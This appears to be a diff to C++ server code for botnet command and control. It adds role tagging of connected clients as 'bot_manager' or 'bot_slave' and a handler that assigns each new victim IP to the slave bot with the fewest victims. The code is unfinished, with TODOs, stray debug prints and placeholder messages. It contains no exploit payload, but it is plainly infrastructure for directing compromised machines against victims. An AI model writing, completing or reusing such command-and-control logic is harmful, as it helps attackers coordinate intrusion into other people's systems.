@@ -67,6 +67,12 @@ void server::handleResponse(std::string& query, session* client) {
 	updateMsgCounter_(client);
 	auto handler = command_handlers_.find(parsed_msg["command"][0])->second;
 	if (handler) handler(parsed_msg["command"][0], parsed_msg["params"], client);
+
+
+//	for (const auto& cl : clients_data_container_) {
+//		std::cout << "CLIENT: " << cl.first << " INFO:" << cl.second.status  << " VICTIMS:" << cl.second.victims << "\n";
+//	}
+
 }
 
 void server::handleAlive(std::string& command, std::vector<std::string>& params, session* client) {
@@ -82,11 +88,18 @@ void server::handleInit(std::string& command, std::vector<std::string>& params, 
 			admin_hash_ = hasher(params[0]);
 			PRINT(command, " was successfull!");
 		}
+
 	}
 
 	if (clients_data_container_.find(client->ip_) != clients_data_container_.end()) {
 		clients_data_container_[client->ip_].id = clients_sessions_container_.find(client->id_)->first;
 		clients_data_container_[client->ip_].connected = getCurrentDateTime_();
+
+		if (params.size() && checkHash_(params[0])) {
+			clients_data_container_[client->ip_].status = "bot_manager";
+		} else {
+			clients_data_container_[client->ip_].status = "bot_slave";
+		}
 	}
 
 	std::vector<std::string> output_params = {"1"};
@@ -157,6 +170,7 @@ void server::handleRemoveVictim(std::string& command, std::vector<std::string>& 
 	auto victim = params[1];
 	PRINT("REMOVING VICTIM: ", victim);
 
+
 	// TODO:@mark need to remove the given victim
 }
 
@@ -167,6 +181,26 @@ void server::handleAddVictim(std::string& command, std::vector<std::string>& par
 	std::string victim_ip = params[1];
 
 	PRINT("ADDING NEW VICTIM: ", victim_ip);
+
+	size_t client_id_for_min_victims = -1;
+	int min_victims = INT_MAX;
+
+	for (const auto& cl : clients_data_container_) {
+		//std::cout << cl.second.id << "\n";
+		if (cl.second.victims < min_victims && cl.second.status == "bot_slave") {
+			min_victims = cl.second.victims;
+			client_id_for_min_victims = cl.second.id;
+		}
+	}
+	std::cout << "FINAL ID: " << client_id_for_min_victims << "\n";
+	std::cout << "LALAs " << clients_sessions_container_.find(client_id_for_min_victims)->second->ip_ << "\n";
+
+	std::vector<std::string> output_params = {"YOURREVCEIVE"};
+	std::string comm = "[RU_HERE]";
+	auto client_id_for_min_victims_session = clients_sessions_container_.find(client_id_for_min_victims)->second;
+
+	client_id_for_min_victims_session->send("Watch me whip\n");
+
 	// TODO:@mark add new victim to structure + check if given ip is valid address
 }
 
